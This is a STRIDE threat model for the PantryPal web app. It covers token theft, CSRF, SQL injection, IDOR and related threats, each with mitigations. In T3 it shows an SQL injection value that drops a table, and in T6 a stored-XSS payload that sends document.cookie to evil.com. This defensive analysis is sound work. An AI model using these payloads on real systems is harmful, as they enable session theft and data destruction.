# Threat Model — PantryPal

> Security analysis of key threats, attack vectors, risk levels, and mitigations for the PantryPal application.

---

## Methodology

This threat model uses the **STRIDE** framework (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to categorize threats, and a simple risk matrix for prioritization.

**Risk levels:**
- 🔴 **High** — Likely to occur, severe impact if exploited
- 🟡 **Medium** — Possible, moderate impact
- 🟢 **Low** — Unlikely or low impact

---

## System Assets Being Protected

| Asset | Sensitivity | Notes |
|-------|------------|-------|
| User passwords | Critical | Must never be stored in plaintext |
| JWT access tokens | High | Grant API access; short-lived |
| JWT refresh tokens | High | Long-lived; stored in HTTP-only cookie |
| User pantry data | Medium | Private per user, not highly sensitive |
| User email addresses | Medium | PII — cannot be exposed to other users |
| Recipe/category data | Low | Shared across users |

---

## Threat Table

### T1 — JWT Access Token Theft via XSS

| Attribute | Details |
|-----------|---------|
| **Category** | Spoofing / Information Disclosure |
| **Attack Vector** | A malicious script injected into the page (XSS) reads the access token from JavaScript memory or localStorage and exfiltrates it to an attacker-controlled server |
| **Risk Level** | 🟡 Medium |
| **Likelihood** | Medium — React's JSX auto-escapes output, reducing XSS risk significantly |
| **Impact** | High — attacker can impersonate user for up to 15 minutes |

**Mitigations:**
- ✅ Access token stored **in memory only** (Zustand store, not localStorage or sessionStorage) — prevents persistent XSS token theft
- ✅ Refresh token stored in **HTTP-only cookie** — completely inaccessible to JavaScript
- ✅ React's built-in JSX escaping prevents most reflected/stored XSS
- ✅ Short access token lifetime (15 minutes) limits damage window
- ✅ Content Security Policy (CSP) header to restrict script sources

**Residual risk:** An XSS attack during an active session could still read the in-memory access token. This is an accepted residual risk; mitigation is the short token lifetime.

---

### T2 — JWT Refresh Token Theft via Cookie Theft / CSRF

| Attribute | Details |
|-----------|---------|
| **Category** | Spoofing |
| **Attack Vector** | Attacker tricks the user's browser into making a cross-origin request to `/auth/refresh`, automatically sending the HTTP-only cookie |
| **Risk Level** | 🟡 Medium |
| **Likelihood** | Medium |
| **Impact** | High — attacker could obtain new access tokens if refresh succeeds |

**Mitigations:**
- ✅ Refresh token cookie uses `SameSite=Strict` attribute — prevents it from being sent on cross-site requests
- ✅ CORS configured to only allow the frontend origin (`http://localhost:5173` in development)
- ⚠️ No CSRF token implemented (SameSite=Strict provides equivalent protection for modern browsers)

**Residual risk:** Browsers older than 2020 may not support SameSite. Acceptable for this project scope.

---

### T3 — SQL Injection

| Attribute | Details |
|-----------|---------|
| **Category** | Tampering / Information Disclosure |
| **Attack Vector** | Attacker injects SQL via input fields (e.g., pantry item name: `'; DROP TABLE "PantryItem"; --`) |
| **Risk Level** | 🟢 Low |
| **Likelihood** | Low — Prisma ORM uses parameterized queries exclusively |
| **Impact** | Critical if exploited — full database access |

**Mitigations:**
- ✅ **Prisma ORM** uses parameterized queries for all database operations — SQL injection is structurally prevented at the ORM level
- ✅ No raw SQL queries used anywhere in the codebase; Prisma's `$queryRaw` is not used
- ✅ Input validation (Zod) rejects inputs exceeding length limits before they reach the database

**Residual risk:** Near zero — parameterized queries prevent SQL injection by design.

---

### T4 — Broken Authentication (Weak Password / Brute Force)

| Attribute | Details |
|-----------|---------|
| **Category** | Spoofing / Elevation of Privilege |
| **Attack Vector** | Attacker attempts to log in with common passwords or systematically tries all combinations |
| **Risk Level** | 🟡 Medium |
| **Likelihood** | Medium — login endpoints are a common brute force target |
| **Impact** | High — full account compromise |

**Mitigations:**
- ✅ Passwords hashed with **bcrypt (12 rounds)** — computationally expensive for attackers
- ✅ Minimum password length enforced at the API level (Zod: min 8 characters)
- ⚠️ **No rate limiting implemented** — documented as a known limitation
- ⚠️ No account lockout — documented as a known limitation

**Recommended mitigations (not implemented — future work):**
- Implement `express-rate-limit` on authentication endpoints (e.g., 5 attempts per 15 minutes per IP)
- Add CAPTCHA on login after 3 failed attempts

---

### T5 — Insecure Direct Object Reference (IDOR)

| Attribute | Details |
|-----------|---------|
| **Category** | Information Disclosure / Elevation of Privilege |
| **Attack Vector** | Authenticated user manipulates the pantry item ID in a request URL (`GET /pantry/items/<other-user-item-id>`) to access another user's data |
| **Risk Level** | 🔴 High (by likelihood of occurrence in poorly implemented systems) |
| **Likelihood** | High if not mitigated |
| **Impact** | Medium — user B reads user A's pantry data |

**Mitigations:**
- ✅ All pantry/shopping list queries are **filtered by `userId` extracted from the JWT** — not from request parameters
- ✅ If the requested item exists but belongs to another user, it returns `404 Not Found` (does not reveal ownership)
- ✅ UUIDs used as primary keys — not guessable sequential integers

**Example of correct implementation:**
```typescript
// CORRECT — userId comes from JWT, not from URL params
async findById(itemId: string, authenticatedUserId: string) {
  return prisma.pantryItem.findFirst({
    where: { id: itemId, userId: authenticatedUserId } // ownership enforced
  });
}
```

---

### T6 — Cross-Site Scripting (XSS) via Stored User Content

| Attribute | Details |
|-----------|---------|
| **Category** | Tampering |
| **Attack Vector** | Attacker stores a malicious script in a pantry item name (`<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`), which executes when other users view the item |
| **Risk Level** | 🟢 Low |
| **Likelihood** | Low — React's JSX rendering escapes HTML by default; pantry data is user-specific |
| **Impact** | Medium if exploited |

**Mitigations:**
- ✅ React automatically escapes values rendered via JSX — `{item.name}` is safe
- ✅ Zod validation enforces maximum string lengths and rejects obviously malicious patterns
- ✅ PantryPal does not render HTML from user input (no `dangerouslySetInnerHTML`)
- ✅ Content-Security-Policy header blocks inline scripts

---

### T7 — Sensitive Data Exposure

| Attribute | Details |
|-----------|---------|
| **Category** | Information Disclosure |
| **Attack Vector** | Password hashes, internal stack traces, or database connection strings exposed in API responses or logs |
| **Risk Level** | 🔴 High (if misconfigured) |
| **Likelihood** | Medium — common mistake in Express apps |
| **Impact** | Critical for password hash exposure |

**Mitigations:**
- ✅ **Password hash is never included in API responses** — Prisma model projections always exclude `passwordHash`
- ✅ Global error handler catches all exceptions and returns sanitized messages — internal `err.stack` is never sent to clients
- ✅ Database URL stored in `.env` — `.env` is gitignored
- ✅ JWT secrets stored in environment variables — never hardcoded
- ✅ Logging configured to redact sensitive fields (headers, tokens) before writing to log output

---

### T8 — Elevation of Privilege (Role Bypass)

| Attribute | Details |
|-----------|---------|
| **Category** | Elevation of Privilege |
| **Attack Vector** | Regular user crafts a request to an admin endpoint (e.g., `POST /admin/categories`) by manipulating the request |
| **Risk Level** | 🟡 Medium |
| **Likelihood** | Low — requires knowing the endpoint; JWT contains role |
| **Impact** | Medium — unauthorized recipe/category management |

**Mitigations:**
- ✅ `role` claim is embedded in the JWT payload at login time
- ✅ `requireRole('ADMIN')` middleware applied on all admin endpoints
- ✅ Role stored in the database; JWT role is validated against DB record on sensitive operations

---

## Summary Risk Matrix

| ID | Threat | Risk | Status |
|----|--------|------|--------|
| T1 | JWT Access Token Theft (XSS) | 🟡 Medium | Mitigated (in-memory storage, short TTL) |
| T2 | CSRF / Refresh Token Theft | 🟡 Medium | Mitigated (SameSite=Strict, CORS) |
| T3 | SQL Injection | 🟢 Low | Mitigated (Prisma parameterized queries) |
| T4 | Brute Force Authentication | 🟡 Medium | Partially mitigated (bcrypt); rate limiting is future work |
| T5 | IDOR — Cross-User Data Access | 🔴 High | Mitigated (userId filter from JWT) |
| T6 | Stored XSS | 🟢 Low | Mitigated (React JSX escaping) |
| T7 | Sensitive Data Exposure | 🔴 High | Mitigated (response projection, env vars) |
| T8 | Role Elevation | 🟡 Medium | Mitigated (JWT role claims, role middleware) |

---

## Known Limitations (Accepted for Project Scope)

| Limitation | Impact | Future Mitigation |
|-----------|--------|------------------|
| No rate limiting on auth endpoints | Brute force possible | `express-rate-limit` |
| No JWT refresh token rotation | Stolen refresh token stays valid | Implement token rotation + denylist |
| No account lockout | Unlimited login attempts | Lockout after N failures |
| HTTP only (no TLS in local dev) | Traffic interception possible | HTTPS required in production |
| No audit logging | No trail of security events | Structured audit log table |
